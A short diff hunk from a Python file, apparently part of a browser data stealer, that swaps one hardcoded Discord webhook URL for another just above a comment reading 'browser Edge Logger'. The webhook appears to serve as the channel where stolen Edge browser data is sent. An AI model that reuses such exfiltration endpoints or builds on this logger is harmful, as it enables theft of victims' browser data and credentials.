@@ -18,7 +18,7 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 
 
 # Webhook here
-HookX = "https://discord.com/api/webhooks/1036255378436018216/AYVwdBcuZQKIB3KtyXOFxMk4bk80NfKbGkfZTopGpWCaT-b2NAf3lUFirWlqQ1-0hNeh"
+HookX = "https://discord.com/api/webhooks/1258228325046812773/82Jk7qhwPOgaTXybrZyZiDpLwD1OeKSBuyrexg0BXt5C0g9QwCHtyUVM2eNSOakwOUir"
 
 # browser Edge Logger
 
